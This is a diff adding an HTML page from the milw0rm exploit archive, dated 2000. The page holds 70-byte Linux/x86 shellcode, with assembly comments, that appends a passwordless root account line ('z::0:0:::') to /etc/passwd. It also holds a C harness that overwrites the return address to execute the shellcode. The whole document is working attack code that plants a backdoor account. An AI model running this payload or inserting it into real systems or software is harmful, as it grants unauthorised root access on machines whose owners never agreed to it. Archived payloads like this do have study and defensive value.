@@ -1,0 +1,53 @@
+<html>
+<head>
+<title>linux/x86 add user 70 bytes</title>
+<pre>
+/*
+ *  Linux/x86
+ *
+ *  Appends the line &quot;z::0:0:::\n&quot; to /etc/passwd.
+ *  (quite old, could be optimized further)
+ */
+#include &lt;stdio.h&gt;
+
+char c0de[] =
+/* main: */
+&quot;\xeb\x29&quot;                           /* jmp callz                */
+/* start: */
+&quot;\x5e&quot;                               /* popl %esi                */
+&quot;\x29\xc0&quot;                           /* subl %eax, %eax          */
+&quot;\x88\x46\x0b&quot;                       /* movb %al, 0x0b(%esi)     */
+&quot;\x89\xf3&quot;                           /* movl %esi, %ebx          */
+&quot;\x66\xb9\x01\x04&quot;                   /* movw $0x401, %cx         */
+&quot;\x66\xba\xb6\x01&quot;                   /* movw $0x1b6, %dx         */
+&quot;\xb0\x05&quot;                           /* movb $0x05, %al          */
+&quot;\xcd\x80&quot;                           /* int $0x80                */
+&quot;\x93&quot;                               /* xchgl %eax, %ebx         */
+&quot;\x29\xc0&quot;                           /* subl %eax, %eax          */
+&quot;\x29\xd2&quot;                           /* subl %edx, %edx          */
+&quot;\xb0\x04&quot;                           /* movb $0x04, %al          */
+&quot;\x89\xf1&quot;                           /* movl %esi, %ecx          */
+&quot;\x80\xc1\x0c&quot;                       /* addb $0x0c, %cl          */
+&quot;\xb2\x0a&quot;                           /* movb $0x0a, %dl          */
+&quot;\xcd\x80&quot;                           /* int $0x80                */
+&quot;\x29\xc0&quot;                           /* subl %eax, %eax          */
+&quot;\x40&quot;                               /* incl %eax                */
+&quot;\xcd\x80&quot;                           /* int $0x80                */
+/* callz: */
+&quot;\xe8\xd2\xff\xff\xff&quot;               /* call start               */
+/* DATA */
+&quot;/etc/passwd&quot;
+&quot;\xff&quot;
+&quot;z::0:0:::\n&quot;;
+
+main() {
+        int *ret;
+        ret=(int *)&amp;ret +2;
+        printf(&quot;Shellcode lenght=%d\n&quot;,strlen(c0de));
+        (*ret) = (int)c0de;
+}
+
+// milw0rm.com [2000-08-07]
+</pre>
+</html>
+
